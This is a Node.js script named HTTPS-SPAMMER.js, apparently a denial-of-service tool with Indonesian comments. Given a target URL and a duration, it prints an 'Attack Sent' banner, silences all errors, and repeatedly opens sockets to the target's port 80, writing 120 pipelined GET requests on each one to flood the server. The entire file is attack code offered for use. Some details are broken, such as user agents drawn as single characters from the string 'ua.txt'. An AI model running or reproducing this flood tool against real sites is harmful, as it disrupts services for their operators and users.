const fs = require('fs');
const url = require('url');
const net = require('net');
const colors = require('colors');
if (process.argv.length <= 2) {
	console.log("node HTTPS-SPAMMER.js url time");
	console.log("Edit by emp001 (staff)");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

process.on('uncaughtException', function (e) {
    // Mengabaikan output error
});

try {
    console.log(colors.red("█▄░█ █░█ █▀ ▄▀█ █▄░█ ▀█▀ ▄▀█ █▀█ ▄▀█   █▀▀ ▀█"));
    console.log(colors.white("█░▀█ █▄█ ▄█ █▀█ █░▀█ ░█░ █▀█ █▀▄ █▀█   █▄▄ █▄ "));
    console.log(colors.red("Attack Sent"));
    console.log(colors.red("Method: HTTPS-SPAMMER"));
    console.log(colors.white("Time: " + time));
    console.log(colors.white("Thread: 95500"));
} catch (e) {
    // Mengabaikan output error
}
var ua = ("ua.txt");
var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 120; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + ua[Math.floor(Math.random() * ua.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=640000\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);
